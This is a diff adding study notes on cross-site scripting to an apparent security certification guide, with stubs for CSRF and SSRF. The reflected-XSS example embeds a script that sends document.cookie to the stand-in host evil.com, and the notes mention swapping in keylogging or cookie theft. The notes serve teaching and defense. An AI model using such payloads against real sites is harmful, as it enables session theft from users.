@@ -771,8 +771,24 @@ Definition: Identify, prioritize and remediate vulnerabilities in your environme
 
 ### Exploiting Web Application Vulnerabilities
 
-* **Cross-Site-Scripting XSS**
+* **Cross-Site Scripting XSS** - when an attacker does HTML injection (inject their own HTML into a webpage)
+  * **Reflected XSS**
+    * When an application allows *"reflected input"*
+    * Anywhere, where a user can provide "input" that later would be viewed by another user there is a XSS oppertunity.
+    * Example `https://news.com/search.php?q=<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>` assuming that the search page would (without validation) render the search query `q` in the html (`Search results for q`.)
+  * **Stored/Persistent XSS**
+    * Here the XSS script is stored server/side
+    * Example: I leave a product review with content `Good product! <script>alert('oi')</script>`
+      * If this input is not sanatized or cleaned, it will store this string in the database.
+      * When someone else views the product, and all comments are rendered underneath, the `<script>alert('oi')</script>` part will be seen as actual HTML and the script tag will execute.
+      * Now you can replace `alert('oi')` with javascript that will log your keys, steal your cookies, etc... cause you are now runng a script under the domain of the trusted site.
+    * ⚠️ Think of other ways where you can "inject HTML" on the request route or from a browser plugin.
+    * Solutions
+      * Input validation and escaping
+      * [OWASP Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
 * **Request Forgery**
+  * **Cross-Site Request Forgery CSRF/XSRF**
+  * **Server-Side Request Forgery SSRF**
 
 ### Application Security Controls
 
